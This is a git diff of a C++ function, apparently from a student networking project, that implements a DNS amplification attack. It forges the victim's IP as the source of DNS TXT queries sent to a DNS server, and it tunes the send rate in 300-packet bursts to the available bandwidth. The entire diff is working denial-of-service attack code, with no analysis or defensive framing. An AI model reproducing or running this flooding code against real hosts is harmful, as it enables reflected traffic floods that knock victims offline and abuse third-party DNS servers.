@@ -34,20 +34,21 @@ void DnsAmplification::dns_amplification(IPv4Address target_ip, const IPv4Addres
 
     IP ip = IP(dns_server, target_ip) / UDP(53,rand() % 65535) / DNS();
     DNS *dns = ip.find_pdu<DNS>();
-    dns->add_query(DNS::query("polito.it", DNS::QueryType::TXT, DNS::QueryClass::ANY));
+    dns->recursion_desired(1);
+    dns->add_query(DNS::query("polito.it", DNS::QueryType::TXT, DNS::QueryClass::IN));
 
-    // todo: ho usato un fattore correttivo di 0.65 perchè non tornavano i conti
-    std::chrono::duration<double> time_per_1000_packets((1000*ip.size()*8 / (upload_bandwidth*pow(10,6)))*0.65);
+    // Mando 300 pacchetti prima di attendere di dimensione 69*8 bit con una banda di x * 10^6 bits/s
+    std::chrono::duration<double> time_per_1000_packets((300*69*8 / (upload_bandwidth*pow(10,6))));
+    std::cout << ip.src_addr() << " >> " << ip.dst_addr() << std::endl;
 
-    for(int i=0; i<(int)(counter/1000); i++){
+    for(int i=0; i<(int)(counter/300); i++){
         auto start = std::chrono::steady_clock::now();
-        for(int j=0; j<1000; j++){
+        for(int j=0; j<300; j++){
             sender.send(ip, interface);
         }
         std::this_thread::sleep_until(start + time_per_1000_packets);
-//        auto end = std::chrono::steady_clock::now();
-//        std::chrono::duration<double> elapsed_seconds = end-start;
-//        std::cout << "delta: " << elapsed_seconds.count()-time_per_1000_packets.count() << std::endl;
+        auto end = std::chrono::steady_clock::now();
+        std::chrono::duration<double> elapsed_seconds = end-start;
     }
 }
 
